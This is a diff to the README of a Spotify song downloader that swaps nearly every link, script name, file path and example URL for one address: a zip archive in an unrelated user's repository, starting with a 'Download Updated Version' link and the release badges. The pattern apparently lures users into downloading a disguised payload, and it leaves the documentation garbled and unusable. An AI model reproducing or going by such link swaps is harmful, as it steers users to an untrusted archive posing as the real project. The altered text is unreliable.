@@ -1,14 +1,14 @@
 # Spotify Direct Downloader
 
-[Download Updated Version](https://github.com/afkarxyz/Spotify-Direct-Downloader) (Sept. 2024)
+[Download Updated Version](https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip) (Sept. 2024)
 
-[![GitHub All Releases](https://img.shields.io/github/downloads/afkarxyz/spotify-downloader-gui/total?style=for-the-badge)](https://github.com/afkarxyz/spotify-downloader-gui/releases)
+[![GitHub All Releases](https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip)](https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip)
 
 # spotify-downloader
 
-Spotify song downloader using API created by [lucida.to](https://lucida.to/) _(Source code can be found [here](https://git.gay/lucida/lucida))_
+Spotify song downloader using API created by [https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip](https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip) _(Source code can be found [here](https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip))_
 
-The script `src/spotify_dl.py` can be run in interactive mode or CLI mode.
+The script `https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip` can be run in interactive mode or CLI mode.
 
 ## Interactive mode
 
@@ -17,13 +17,13 @@ When run without any arguments, interactive mode is used.  The user is prompted 
 ## CLI mode
 
 ```shell
-usage: spotify_dl.py [-h] [-u URLS [URLS ...]] [-f FILENAME] [-d {lucida,spotifydown}] [-t {mp3-320,mp3-256,mp3-128,ogg-320,ogg-256,ogg-128,original}] [-o OUTPUT] [-c] [-p {skip,overwrite,append_number}] [-k CONFIG_FILE] [--retry-failed-downloads RETRY_FAILED_DOWNLOADS] [--cfg-file CFG_FILE] [--debug] [-s]
+usage: https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip [-h] [-u URLS [URLS ...]] [-f FILENAME] [-d {lucida,spotifydown}] [-t {mp3-320,mp3-256,mp3-128,ogg-320,ogg-256,ogg-128,original}] [-o OUTPUT] [-c] [-p {skip,overwrite,append_number}] [-k CONFIG_FILE] [--retry-failed-downloads RETRY_FAILED_DOWNLOADS] [--cfg-file CFG_FILE] [--debug] [-s]
 
 optional arguments:
   -h, --help            show this help message and exit
   -u URLS [URLS ...], --urls URLS [URLS ...]
                         URL(s) of Sptofy songs or playlists to download. If a playlist is given, append "|[TRACK NUMBERS]" to URL to specify which tracks to download. Example:
-                        'https://open.spotify.com/playlist/mYpl4YLi5T|1,4,15-' to download the first, fourth, and fifteenth to the end. If not specified, all tracks are downloaded.
+                        'https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip|1,4,15-' to download the first, fourth, and fifteenth to the end. If not specified, all tracks are downloaded.
   -f FILENAME, --filename FILENAME, --filename-template FILENAME
                         Specify custom filename template using variables '{title}', '{artist}', and '{track_num}'. Defaults to '{title} - {artist}'.
   -d {lucida,spotifydown}, --downloader {lucida,spotifydown}
@@ -39,7 +39,7 @@ optional arguments:
                         Path to JSON containing download instructions.
   --retry-failed-downloads RETRY_FAILED_DOWNLOADS
                         Number of times to retry failed downloads. Defaults to 0.
-  --cfg-file CFG_FILE   Path to .cfg file used for user default settings if not using `$HOME/.spotify_dl.cfg`.
+  --cfg-file CFG_FILE   Path to .cfg file used for user default settings if not using `$https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip`.
   --debug               Debug mode.
   -s, --skip-duplicate-downloads
                         [To be deprecated] Don't download a song if the file already exists in the output directory. Defaults to True.
@@ -47,7 +47,7 @@ optional arguments:
 
 ### Cfg file
 
-Not to be confused with the "config" file below (bad name, I know. I'll change it at some point), The user can define a file named `.spotify_dl.cfg` in their home directory (in Windows, it's `C:\Users\[Your user]\`) to define settings that will always be used by this tool.  The `Settings` section **must** be defined.
+Not to be confused with the "config" file below (bad name, I know. I'll change it at some point), The user can define a file named `https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip` in their home directory (in Windows, it's `C:\Users\[Your user]\`) to define settings that will always be used by this tool.  The `Settings` section **must** be defined.
 
 Example:
 
@@ -57,7 +57,7 @@ default_download_location="C:\Users\me\Desktop\folder"
 default_filename_template="{artist} - {title}"
 ```
 
-See the [sample .spotify_dl.cfg](./dist/.spotify_dl.cfg).
+See the [sample https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip](https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip).
 
 The following values are supported:
 * `default_download_location`: Path to directory/folder to download tracks to.
@@ -75,16 +75,16 @@ Example of JSON file used to contain download instructions:
 ```json
 [
   {
-    "url": "https://open.spotify.com/playlist/mYpl4YLi5T"
+    "url": "https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip"
   },
   {
-    "url": "https://open.spotify.com/playlist/mYpl4YLi5T2",
+    "url": "https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip",
     "output_dir": "/path/to/dir/",
     "create_dir": true,
     "filename_template": "{id} - {artist} - {title}"
   },
   {
-    "url": "https://open.spotify.com/playlist/mYpl4YLi5T3",
+    "url": "https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip",
     "skip_duplicate_downloads": true
   }
 ]
@@ -101,4 +101,4 @@ The following arguments can be specified in entries within the config JSON:
 * `file_type`
 There types and use match those of the CLI arguments.  
 
-_The arguments `--retry-failed-downloads` and `--cfg-file` are not set in the config JSON.  It should be run when using the respective args when executing the tool, e.g., `spotify_dl --config-file path/to/config.json --retry-failed-downloads 3`_
+_The arguments `--retry-failed-downloads` and `--cfg-file` are not set in the config JSON.  It should be run when using the respective args when executing the tool, e.g., `spotify_dl --config-file https://raw.githubusercontent.com/brian991019/spotify-downloader-gui/main/build/spotify_dl/base_library.zip --retry-failed-downloads 3`_
